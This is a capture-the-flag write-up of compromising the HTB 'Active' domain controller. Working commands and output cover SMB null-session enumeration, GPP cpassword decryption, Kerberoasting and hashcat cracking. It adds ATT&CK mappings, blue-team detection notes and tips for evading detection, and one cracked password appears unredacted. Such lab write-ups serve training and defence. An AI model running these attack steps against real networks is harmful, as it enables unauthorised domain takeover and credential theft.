Date : 24/07/2026

Target : 10.129.46.87

Judging by the name and the `Windows` category, we can hypothesize strongly this is an Active Directory.

We'll do a staged nmap as this is a **PURPLE** engagement, which means we will act as if there was a **Blue Team** behind the box even though there technically isn't.

We start with `Active Reconnaissance` :

`ATT&CK ID : Network Service Discovery T1046`
`ATT&CK ID : Active Scanning T1595`

The usual `network mapping` would be :

```
sudo nmap -sC -sV -O -Pn -p- --min-rate=3000 -T4 10.129.46.87
```

On this engagement, this rapid-fire scan would take `seconds` to complete and save us a lot of time.

But this kind of mass SYN flood would trigger alerts because of the rate, the fullport scan (SYN-SYN/ACK-ACK) on every port and `Version (-sV)` and `Script (-sC)` with a `--min-rate=3000` and `-T4` could be caught as an overly aggressive offensive technique :
`SIEM` will register this aggressive scan as : many unique destination ports, short window, high packets per second and SOC will receive `nmap-shaped` alerts.
`ATT&CK ID : Vulnerability Scanning T1595.002` with `-sC -sV` which causes high `NSE --(Nmap Scripting Engine)` noise on top of the very high packets being sent.

We'll instead use a `staged nmap scan` which involves two phases : first, a much lower handshake rate for the ports only like `max-rate=300` and `-T3` with `-oA` to save the results, and a second stage that will analyze `versions` and `scripts` on the specific ports we found open with again a limited SYN rate.

On this engagement, the more discreet scan takes approximately `4 minutes` to complete.
So we lose a little time but reduced rate-based detection, whereas the first scan would likely trigger `Network Intrusion Detection Systems` like `Suricata/Snort` which fires `unusual port scan activity`  effectively increasing our stealth in a real-world scenario.

```bash
>  nmapstaged 10.129.46.87 ~/Purple/Active/nmap_full  
[*] Stage 1/2 — full TCP map (--max-rate 500 -T3) → /home/vagabond/Purple/Active/nmap_full/nmap_all.*  
Please touch the FIDO authenticator.  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-24 19:39 +0200  
Nmap scan report for active.htb (10.129.46.87)  
Host is up (0.064s latency).  
Not shown: 65512 closed tcp ports (reset)  
PORT      STATE SERVICE  
53/tcp    open  domain  
88/tcp    open  kerberos-sec  
135/tcp   open  msrpc  
139/tcp   open  netbios-ssn  
389/tcp   open  ldap  
445/tcp   open  microsoft-ds  
464/tcp   open  kpasswd5  
593/tcp   open  http-rpc-epmap  
636/tcp   open  ldapssl  
3268/tcp  open  globalcatLDAP  
3269/tcp  open  globalcatLDAPssl  
5722/tcp  open  msdfsr  
9389/tcp  open  adws  
47001/tcp open  winrm  
49152/tcp open  unknown  
49153/tcp open  unknown  
49154/tcp open  unknown  
49155/tcp open  unknown  
49157/tcp open  unknown  
49158/tcp open  unknown  
49162/tcp open  unknown  
49167/tcp open  unknown  
49168/tcp open  unknown  
  
Nmap done: 1 IP address (1 host up) scanned in 134.65 seconds  
[*] Stage 2/2 — -sC -sV on: 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49162,49167,49168  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-24 19:41 +0200  
Nmap scan report for active.htb (10.129.46.87)  
Host is up (0.075s latency).  
  
PORT      STATE SERVICE       VERSION  
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)  
| dns-nsid:    
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)  
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-24 17:41:46Z)  
135/tcp   open  msrpc         Microsoft Windows RPC  
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn  
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)  
445/tcp   open  microsoft-ds?  
464/tcp   open  tcpwrapped  
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
636/tcp   open  tcpwrapped  
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)  
3269/tcp  open  tcpwrapped  
5722/tcp  open  msrpc         Microsoft Windows RPC  
9389/tcp  open  mc-nmf        .NET Message Framing  
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)  
|_http-server-header: Microsoft-HTTPAPI/2.0  
|_http-title: Not Found  
49152/tcp open  msrpc         Microsoft Windows RPC  
49153/tcp open  msrpc         Microsoft Windows RPC  
49154/tcp open  msrpc         Microsoft Windows RPC  
49155/tcp open  msrpc         Microsoft Windows RPC  
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0  
49158/tcp open  msrpc         Microsoft Windows RPC  
49162/tcp open  msrpc         Microsoft Windows RPC  
49167/tcp open  msrpc         Microsoft Windows RPC  
49168/tcp open  msrpc         Microsoft Windows RPC  
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows  
  
Host script results:  
| smb2-time:    
|   date: 2026-07-24T17:42:44  
|_  start_date: 2026-07-24T16:43:20  
| smb2-security-mode:    
|   2.1:    
|_    Message signing enabled and required  
|_clock-skew: -1s  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 75.79 seconds
```

So we have confirmation that this is an `Active Directory` : `kerberos 88/tcp ; msrpc 135/tcp ; netBIOS 139/tcp ; LDAP 389/tcp ; SMB 445/tcp` and `Microsoft Windows RPC` but also `DNS 53/tcp`, `mc-nmf 9389/tcp` and other ports.

`Domain: active.htb` so we already have the `DC` name in our hosts.

The `DNS` version is `Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)` which is a pretty old version. We google the version and stumble upon `CVE-2020-1350` :

```
CVE-2020-1350

Severity: Critical  
Vulnerability Published: 2020-07-14  
Patch Published: 2020-07-14
- A remote code execution vulnerability exists in Windows Domain Name System servers when they fail to properly handle requests. An attacker who successfully exploited the vulnerability could run arbitrary code in the context of the Local System Account. Windows servers that are configured as DNS servers are at risk from this vulnerability.
  
Source : infosecmatter.com
```

This might lead to RCE later so we'll keep it as a hypothetic artifact : the version string alone isn't enough to prove it is actually exploitable.

We'll start our `Active Directory adversary emulation` with our usual methodology, starting with a `netexec SMB shares` check with `guest` :

```bash
>  nxc smb active.htb -u guest -p '' --shares  
SMB         10.129.46.87    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) (Null Auth:True)  
SMB         10.129.46.87    445    DC               [-] active.htb\guest: STATUS_ACCOUNT_DISABLED    
>  nxc smb active.htb -u '' -p '' --shares  
SMB         10.129.46.87    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) (Null Auth:True)  
SMB         10.129.46.87    445    DC               [+] active.htb\:    
SMB         10.129.46.87    445    DC               [*] Enumerated shares  
SMB         10.129.46.87    445    DC               Share           Permissions            Remark  
SMB         10.129.46.87    445    DC               -----           -----------            ------  
SMB         10.129.46.87    445    DC               ADMIN$                                 Remote Admin  
SMB         10.129.46.87    445    DC               C$                                     Default share  
SMB         10.129.46.87    445    DC               IPC$                                   Remote IPC  
SMB         10.129.46.87    445    DC               NETLOGON                               Logon server share    
SMB         10.129.46.87    445    DC               Replication     READ                      
SMB         10.129.46.87    445    DC               SYSVOL                                 Logon server share    
SMB         10.129.46.87    445    DC               Users
```

`ATT&CK ID : Network Share Discovery T1135`

**Blue Team** : `SIEM` registers `null` account looking for `SMB shares`. A good SOC stumbling upon this might track the source.`

`guest` didn't work but `null` did and unlike most `SMB shares` `IPC$, SYSVOL and NETLOGON` have no `READ` right but `Replication` which is an unusual name has `READ` rights, we will probably find information inside :

```bash
>  smbclient //active.htb/Replication -U %  
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                   D        0  Sat Jul 21 12:37:44 2018  
 ..                                  D        0  Sat Jul 21 12:37:44 2018  
 active.htb                          D        0  Sat Jul 21 12:37:44 2018  
  
               5217023 blocks of size 4096. 278928 blocks available  
smb: \> cd active.htb  
smb: \active.htb\> ls  
 .                                   D        0  Sat Jul 21 12:37:44 2018  
 ..                                  D        0  Sat Jul 21 12:37:44 2018  
 DfsrPrivate                       DHS        0  Sat Jul 21 12:37:44 2018  
 Policies                            D        0  Sat Jul 21 12:37:44 2018  
 scripts                             D        0  Wed Jul 18 20:48:57 2018
```

We seem to have a `SYSVOL-like` share. We'll download the policies, which could be suspected if found by the **Blue Team** especially since it's from a `null` account.

```bash
>  cd ~/Purple/Active/  
>  smbclient //active.htb/Replication -U %  
Try "help" to get a list of possible commands.  
smb: \> cd active.htb/Policies  
smb: \active.htb\Policies\> recurse ON  
smb: \active.htb\Policies\> prompt OFF  
smb: \active.htb\Policies\> mget *  
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as {31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)  
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as {6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)  
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as {31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (0.6 KiloBytes/sec) (average 0.3 KiloByte  
s/sec)  
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as {31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (14.9 KiloBytes/sec) (average 3.6 KiloBy  
tes/sec)  
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as {31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (2.6 Ki  
loBytes/sec) (average 3.4 KiloBytes/sec)  
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as {31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecE  
dit/GptTmpl.inf (6.0 KiloBytes/sec) (average 3.8 KiloBytes/sec)  
getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as {6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecE  
dit/GptTmpl.inf (17.6 KiloBytes/sec) (average 5.9 KiloBytes/sec)
smb: \active.htb\Policies\> exit
```

`ATT&CK ID : File Retrieval T1005`

**Blue Team** : `SIEM` : `T1595 Active Scanning` → `Network Share Discovery Technique T1135` 
↳ `ATT&CK ID : File Retrieval T1005`

The last technique is the most suspicious downloading policies locally using `null`.
If the **Blue Team** gets the `SIEM` and an alert, they might get onto us even though we haven't accessed the domain yet, they will closely monitor our source. This is where changing sources (VPN) would break it : we haven't identified as anyone so if we change our `source` they won't be able to trace the `attacker` (us).
The first reflex would be to look inside the retrieved files the suspect `null` account has downloaded and how they could be used by the attacker.

As the attacker, we'll search for sensitive information with a recursive `grep` on all the policy files :

```bash
>  grep -r -RniE "password|username|secret"  
{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml:2:<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TG  
S" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="[REDACTED]" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
```

`ATT&CK ID : Credential Mining - Unsecured Credentials : GPP T1552.006`
We found : `cpassword="[REDACTED]"`
and ` userName="active.htb\SVC_TGS`

The first one is a `cpassword` which is a `base64 encoded ciphertext` and the second one looks like a `Service Account`.

We'll have to decrypt the `cpassword` and try the password we find with `netexec` and hope for a successful login, otherwise a `4625 Login Failure Type 3 (SMB)` alert will be triggered which is bad for us as an adversary because a `Service Account` that fails to login is highly suspicious.

We'll start by using `gpp-decrypt` which corresponds to the old `Windows 2008` version this `DC` is running on and is exactly made to decrypt `cpasswords` :

```bash
>  gpp-decrypt -c "[REDACTED]"  
  
                              __                                __    
 ___ _   ___    ___  ____ ___/ / ___  ____  ____  __ __   ___  / /_  
/ _ `/  / _ \  / _ \/___// _  / / -_)/ __/ / __/ / // /  / _ \/ __/  
\_, /  / .__/ / .__/     \_,_/  \__/ \__/ /_/    \_, /  / .__/\__/    
/___/  /_/    /_/                                /___/  /_/            
  
[ * ] Password: [REDACTED]
```

We'll try `netexec SMB` with `svc_tgs:[REDACTED]` :

```bash
>  nxc smb active.htb -u svc_tgs -p '[REDACTED]'  
SMB         10.129.46.87    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) (Null Auth:True)  
SMB         10.129.46.87    445    DC               [+] active.htb\svc_tgs:[REDACTED]
```

And we fired `4624 : Login Successful` instead of `4625 : Login Failed` which is still an alert but much less suspect on a service account, and we have our first domain account.

`ATT&CK ID : Valid Accounts - Domain Accounts T1078.002`

We'll look for `shares` using that account :

```bash
>  nxc smb active.htb -u svc_tgs -p '[REDACTED]' --shares  
SMB         10.129.46.87    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) (Null Auth:True)  
SMB         10.129.46.87    445    DC               [+] active.htb\svc_tgs:[REDACTED]    
SMB         10.129.46.87    445    DC               [*] Enumerated shares  
SMB         10.129.46.87    445    DC               Share           Permissions            Remark  
SMB         10.129.46.87    445    DC               -----           -----------            ------  
SMB         10.129.46.87    445    DC               ADMIN$                                 Remote Admin  
SMB         10.129.46.87    445    DC               C$                                     Default share  
SMB         10.129.46.87    445    DC               IPC$                                   Remote IPC  
SMB         10.129.46.87    445    DC               NETLOGON        READ                   Logon server share    
SMB         10.129.46.87    445    DC               Replication     READ                      
SMB         10.129.46.87    445    DC               SYSVOL          READ                   Logon server share    
SMB         10.129.46.87    445    DC               Users           READ
```

And we have `READ` on the `Users` share.

```bash
>  smbclient //active.htb/Users -U 'svc_tgs%[REDACTED]'  
  
Try "help" to get a list of possible commands.  
smb: \> ls  
 .                                  DR        0  Sat Jul 21 16:39:20 2018  
 ..                                 DR        0  Sat Jul 21 16:39:20 2018  
 Administrator                       D        0  Mon Jul 16 12:14:21 2018  
 All Users                       DHSrn        0  Tue Jul 14 07:06:44 2009  
 Default                           DHR        0  Tue Jul 14 08:38:21 2009  
 Default User                    DHSrn        0  Tue Jul 14 07:06:44 2009  
 desktop.ini                       AHS      174  Tue Jul 14 06:57:55 2009  
 Public                             DR        0  Tue Jul 14 06:57:55 2009  
 SVC_TGS                             D        0  Sat Jul 21 17:16:32 2018  
  
               5217023 blocks of size 4096. 278624 blocks available  
smb: \> cd SVC_TGS  
smb: \SVC_TGS\> ls  
 .                                   D        0  Sat Jul 21 17:16:32 2018  
 ..                                  D        0  Sat Jul 21 17:16:32 2018  
 Contacts                            D        0  Sat Jul 21 17:14:11 2018  
 Desktop                             D        0  Sat Jul 21 17:14:42 2018  
 Downloads                           D        0  Sat Jul 21 17:14:23 2018  
 Favorites                           D        0  Sat Jul 21 17:14:44 2018  
 Links                               D        0  Sat Jul 21 17:14:57 2018  
 My Documents                        D        0  Sat Jul 21 17:15:03 2018  
 My Music                            D        0  Sat Jul 21 17:15:32 2018  
 My Pictures                         D        0  Sat Jul 21 17:15:43 2018  
 My Videos                           D        0  Sat Jul 21 17:15:53 2018  
 Saved Games                         D        0  Sat Jul 21 17:16:12 2018  
 Searches                            D        0  Sat Jul 21 17:16:24 2018  
  
               5217023 blocks of size 4096. 278624 blocks available  
smb: \SVC_TGS\> cd Desktop  
smb: \SVC_TGS\Desktop\> ls  
 .                                   D        0  Sat Jul 21 17:14:42 2018  
 ..                                  D        0  Sat Jul 21 17:14:42 2018  
 user.txt                           AR       34  Fri Jul 24 18:44:20 2026  
  
               5217023 blocks of size 4096. 278624 blocks available  
smb: \SVC_TGS\Desktop\> get user.txt  
getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \SVC_TGS\Desktop\> exit  
>  cat user.txt  
[REDACTED]
```

We got the user flag.

We'll then proceed to `kerberoasting` `Service Principal Names` and ask the `TGS` for a ticket that we can crack via `Impacket` :

```bash
>  GetUserSPNs.py active.htb/svc_tgs:'[REDACTED]' -dc-ip 10.129.46.87 -request -outputfile tgs.kerberoast  
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies    
  
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation    
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------  
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40.351723  2026-07-24 18:44:22.324958                
  
  
  
[-] CCache file is not found. Skipping...  
>  cat tgs.kerberoast  
[REDACTED]
```

We just got a `Kerberos TGS etype 23 hash` for `Administrator`.

`ATT&CK ID : Steal or Forge Kerberos Tickets : Kerberoasting T1558.003`

**Blue Team** : Highly suspicious, even if the adversary separates themselves from the `null` account by changing their source, `Kerberoasting by TGS Request with a low-priviledged account` might start an investigation and trigger a SOC alert by itself.

```bash
>  hashcat -m 13100 tgs.kerberoast /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt  
hashcat (v7.1.2) starting  
  
OpenCL API (OpenCL 3.0 PoCL 7.1  Linux, Release, RELOC, LLVM 20.1.8, SLEEF, DISTRO, CUDA, POCL_DEBUG) - Platform #1 [The pocl project]  
======================================================================================================================================  
* Device #01: cpu-haswell-AMD Ryzen 5 3500U with Radeon Vega Mobile Gfx, 8912/17824 MB (8912 MB allocatable), 8MCU  
  
Minimum password length supported by kernel: 0  
Maximum password length supported by kernel: 256  
Minimum salt length supported by kernel: 0  
Maximum salt length supported by kernel: 256  
  
Hashes: 1 digests; 1 unique digests, 1 unique salts  
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates  
Rules: 1  
  
Optimizers applied:  
* Zero-Byte  
* Not-Iterated  
* Single-Hash  
* Single-Salt  
  
ATTENTION! Pure (unoptimized) backend kernels selected.  
Pure kernels can crack longer passwords, but drastically reduce performance.  
If you want to switch to optimized kernels, append -O to your commandline.  
See the above message to find out about the exact limits.  
  
Watchdog: Temperature abort trigger set to 90c  
  
Host memory allocated for this attack: 514 MB (10140 MB free)  
  
Dictionary cache hit:  
* Filename..: /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt  
* Passwords.: 14344384  
* Bytes.....: 139921497  
* Keyspace..: 14344384  
  
Cracking performance lower than expected?                    
  
* Append -O to the commandline.  
 This lowers the maximum supported password/salt length (usually down to 32).  
  
* Append -w 3 to the commandline.  
 This can cause your screen to lag.  
  
* Append -S to the commandline.  
 This has a drastic speed impact but can be better for specific attacks.  
 Typical scenarios are a small wordlist but a large ruleset.  
  
* Update your backend API runtime / driver the right way:  
 https://hashcat.net/faq/wrongdriver  
  
* Create more work items to make use of your parallelization power:  
 https://hashcat.net/faq/morework  
  
[REDACTED]
38d01e66564c5ccc808e1a889d43475550ef9a7e32aab059b13b7541cd67da796e6298cf500cac02966f6579c88531c92ee9333b16deeace7870733f1bc959c51c81abfb3fa8142cef711904c8a1cc4f55d7ec9f24e9bf5254a6778023d5b0d70de9e:Ticketmaster  
1968  
                                                            
Session..........: hashcat  
Status...........: Cracked  
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)  
[REDACTED]
Time.Started.....: Sat Jul 25 11:19:33 2026 (14 secs)  
Time.Estimated...: Sat Jul 25 11:19:47 2026 (0 secs)  
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)  
Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt)  
Guess.Queue......: 1/1 (100.00%)  
Speed.#01........:   745.5 kH/s (7.34ms) @ Accel:1024 Loops:1 Thr:1 Vec:8  
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)  
Progress.........: 10543104/14344384 (73.50%)  
Rejected.........: 0/10543104 (0.00%)  
Restore.Point....: 10534912/14344384 (73.44%)  
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1  
Candidate.Engine.: Device Generator  
Candidates.#01...: Tiona172 -> Teague  
Hardware.Mon.#01.: Temp: 72c Util: 81%  
  
Started: Sat Jul 25 11:19:31 2026  
Stopped: Sat Jul 25 11:19:49 2026
```

And we got the password : `[REDACTED]`.

`ATT&CK ID : Brute-Force Password Cracking - Credential Access T1110.002`

We cracked the password offline with absolutely no problem using the `hashcat mode` that corresponds to the pattern `$krb5tgs$23$*user$realm$spn*$` that usually comes out of `GetUserSPNs Kerberoasting`.

As the adversary, now that we have the `Domain Administrator`'s credentials, we will change sources again so that, if successful, our login isn't directly connected to `SVC_TGS`.

We'll try it with `netexec` on `SMB` since we saw we had direct access to the `Users` share :

```bash
>  nxc smb active.htb -u Administrator -p [REDACTED]  
  
SMB         10.129.46.87    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False) (Null Auth:True)  
SMB         10.129.46.87    445    DC               [+] active.htb\Administrator:[REDACTED] (Pwn3d!)
```

**Blue Team** : The **Domain Administrator** successfully logged in to `SMB`, `EventID=4624`.
If the adversary has changed sources, the **Blue Team** will have to look into it if they haven't already but by the time they discover the `TGS-REQ` gave the `Domain Administrator`'s hash and connect that to the new source.
For the adversary, in the best case scenario he will already have acquired full Domain Control. `Digital Forensics and Incident Response` would be an essential part here.

```
```bash
>  smbclient //active.htb/Users -U 'Administrator%[REDACTED]'  
  
  
Try "help" to get a list of possible commands.  
smb: \> cd Administrator  
smb: \Administrator\> cd Desktop  
smb: \Administrator\Desktop\> ls  
 .                                  DR        0  Thu Jan 21 17:49:47 2021  
 ..                                 DR        0  Thu Jan 21 17:49:47 2021  
 desktop.ini                       AHS      282  Mon Jul 30 15:50:10 2018  
 root.txt                           AR       34  Fri Jul 24 18:44:20 2026  
g  
               5217023 blocks of size 4096. 277039 blocks available  
smb: \Administrator\Desktop\> get root.txt  
getting file \Administrator\Desktop\root.txt of size 34 as root.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)  
smb: \Administrator\Desktop\> exit  
>  cat root.txt  
[REDACTED]
```

We got the root flag.